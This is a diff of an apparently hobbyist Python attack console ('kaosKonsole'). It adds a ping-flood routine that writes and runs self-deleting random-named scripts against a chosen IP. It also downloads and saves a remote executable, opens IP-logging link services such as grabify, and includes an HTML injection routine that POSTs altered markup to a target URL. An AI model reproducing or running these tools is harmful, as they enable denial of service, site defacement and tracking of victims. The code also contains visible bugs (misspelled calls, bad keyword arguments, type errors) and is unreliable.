@@ -3,23 +3,24 @@ import nmap
 import socket
 import requests
 import platform
+import random
+import string
 from bs4 import BeautifulSoup
 import shutil
 import subprocess
 import urllib.request
-import time
 
 jani09 = platform.system()
 
 defaultpath = os.path.abspath(__file__)
 
-if jani09 == "Windows":
-    os.system("title kaosKonsoleBerryBlast")
-    os.system("color 04")
-elif jani09 == "Linux":
-    os.system("title kaosKonsoleLimeo")
-    os.system("color 04")
 while True:  
+    if jani09 == "Windows":
+        os.system("title kaosKonsoleBerryBlast")
+        os.system("color 04")
+    elif jani09 == "Linux":
+        os.system("title kaosKonsoleLimeo")
+        os.system("color 04")
     print("___________________________________________________________________")
     print("                            _    _                                 ")
     print("    /                       /  ,'                           /      ")
@@ -28,13 +29,6 @@ while True:
     print("_/___\__(___(_(___/_(__)_/____\___(___/_/___/_(__)_(___/_/___(___ _")
 
     print("OS: " + jani09)
-
-    print(time.localtime)
-    print(time.ctime)
-    print(time.mktime)
-    print(time.daylight)
-    print("universal: " + time.gmtime)
-    print("perf: " + time.perf_counter)
 
     print("Exploit: e")
     print("Sniff connections within a range: sniff")
@@ -56,8 +50,6 @@ while True:
         if uri9 == "nmap":
             try:
                 mike4 = input("nmap arguments: ")
-                print("universal: " + time.gmtime)
-                print("perf: " + time.perf_counter)
                 print("Starting nmap scan on: " + p65)
                 print("Arguments: " + mike4)
                 suli0 = nmap.PortScanner()
@@ -90,7 +82,7 @@ while True:
                         print("based")
                         print("downloading infarox..")
 
-                        url = "https://github.com/kaosSec/kaosTools/raw/main/infarox/infarox27/infarox27.EXE"
+                        url = "https://github.com/kaosSec/kaosTools/raw/main/infarox/infarox27.EXE"
                         filename = defaultpath + "\\" + "infarox27.EXE"
                         urllib.request.urlretrieve(url, filename)
 
@@ -228,6 +220,7 @@ while True:
             print("Options:")
             print("-r to specify range")
             j44 = input("Select an IP: ")
+            nuji324 = input("Number of requests: ")
             if "-r" in j44:
                 m77 = int(input("Select da port range: "))
                 julie26 = list(map(int, m77.split()))
@@ -239,22 +232,33 @@ while True:
                     print(port )
                     while True:
                         try:
-                            os.system("ping " + j44 + " " + str(port))
-                            print(str(j44) + str(port) + " +1")
+                            jar44 = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(10)) + ".py"
+                            with open (jar44, "w") as f:
+                                w = f.write
+                                w("import os")
+                                w(f"mh43 = ['ping -n ' + {nuji324} + ' ' + {j44}]")
+                                w("os.system(' '.join(mh43))")
+                                w("os.remove(__file__)")
+                            os.system("python " + jar44)
                         except:
                             print(str(j44) + str(port) + " +0")
             else:
-                p34 = int(input("Select da port: "))
                 if j44 == "99":
                     stop = True
                     break
 
                 while True:
                     try:
-                        os.system("ping " + j44 + " " + str(p34))
-                        print(str(j44) + str(p34) + " +1")
+                        jar44 = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(10)) + ".py"
+                        with open (jar44, "w") as f:
+                            w = f.write
+                            w("import os")
+                            w(f"mh43 = ['ping -n ' + {nuji324} + ' ' + {j44}]")
+                            w("os.system(' '.join(mh43))")
+                            w("os.remove(__file__)")
+                        os.system("python " + jar44)
                     except:
-                        print(str(j44) + str(p34) + " +0")
+                        print(str(j44) + " +0")
                         continue
 
     elif x1 == "sniff":
@@ -364,13 +368,6 @@ while True:
 
         print(" ")
         print(" ")
-
-        print(time.localtime)
-        print(time.ctime)
-        print(time.mktime)
-        print(time.daylight)
-        print("universal: " + time.gmtime)
-        print("perf: " + time.perf_counter)
         
         print(" ")
         print(" ")
@@ -390,7 +387,6 @@ while True:
                     print("Would you like to download HTML presets?")
                     jk23 = input("Y/N: ")
                     if jk23 == "Y":
-                        print("perf: " + time.perf_counter)
                         print("Downloading HTML presets..")
 
                         url = "https://github.com/kaosSec/kaosTools/raw/main/js/htmldp1.html"
@@ -409,12 +405,6 @@ while True:
                     mon4 = input(" ")
                     if mon4 == "github":
                         os.sytem("start https://github.com/new")
-                        print(time.localtime)
-                        print(time.ctime)
-                        print(time.mktime)
-                        print(time.daylight)
-                        print("universal: " + time.gmtime)
-                        print("perf: " + time.perf_counter)
                         print(" ")
                         print(" ")
                         print("using github is pretty simple because of https://pages.github.com")
@@ -436,12 +426,6 @@ while True:
                             print(" #     # #       #    #  #       #     # #     #    #     # #     # #       #  #  # #     # #    #  #       ### ### ")
                             print("  #####  #       #     # ####### #     # ######     #     # #     # #######  ## ##  #     # #     # ####### ### ### ")                                                                           
                             os.system("start https://grabify.link")
-                            print(time.localtime)
-                            print(time.ctime)
-                            print(time.mktime)
-                            print(time.daylight)
-                            print("universal: " + time.gmtime)
-                            print("perf: " + time.perf_counter)
                         elif j61 == "t.ly":
                             print("  #####  ######  ######  #######    #    ######     #     #    #    #       #     #    #    ######  ####### ### ### ")
                             print(" #     # #     # #     # #         # #   #     #    ##   ##   # #   #       #  #  #   # #   #     # #       ### ### ")
@@ -451,21 +435,9 @@ while True:
                             print(" #     # #       #    #  #       #     # #     #    #     # #     # #       #  #  # #     # #    #  #       ### ### ")
                             print("  #####  #       #     # ####### #     # ######     #     # #     # #######  ## ##  #     # #     # ####### ### ### ")      
                             os.system("start https://t.ly/")
-                            print(time.localtime)
-                            print(time.ctime)
-                            print(time.mktime)
-                            print(time.daylight)
-                            print("universal: " + time.gmtime)
-                            print("perf: " + time.perf_counter)
             elif jo4 == "inject":
                 print("neat")
-                print(" ")
-                print(time.localtime)
-                print(time.ctime)
-                print(time.mktime)
-                print(time.daylight)
-                print("universal: " + time.gmtime)
-                print("perf: " + time.perf_counter)      
+                print(" ") 
                 print(" ")
                 print(" ")
                 print("requests")
@@ -531,12 +503,23 @@ while True:
                             b234 = test_case['element']
                             m65 = test_case['tag']
                             v32 = test_case['content']
+                            print("testing: " + gh4)
                             skivi = requests.get(gh4)
+                            print(gh4 + " tested!")
                             rini = BeautifulSoup(skivi.content, 'html.parser')
+                            print("testing: " + b234)
                             ravi13 = rini.find(b234)
+                            print(b234 + " tested!")
+                            print("testing: " + m65)
                             x07 = rini.new_tag(m65)
+                            print(m65 + " tested!")
+                            print("testing: " + v32)
                             x07.string = v32
+                            print(v32 + " tested!")
+                            print("finishing test..")
                             ravi13.append(x07)
+                            print("test complete!")
+                            print("injecting..")
                             jonah40 = requests.post(rita90, dta=str(sovi))
                             rova = requests.get(rita90)
                             sovi = BeautifulSoup(rova.content, 'html.parser')
@@ -545,6 +528,7 @@ while True:
                             x23.string = morgi11
                             blik34.append(x23)
                             jonah40 = requests.post(rita90, dta=str(sovi))
+                            print("injected!")
                         except:
                             print("wango")
                             break
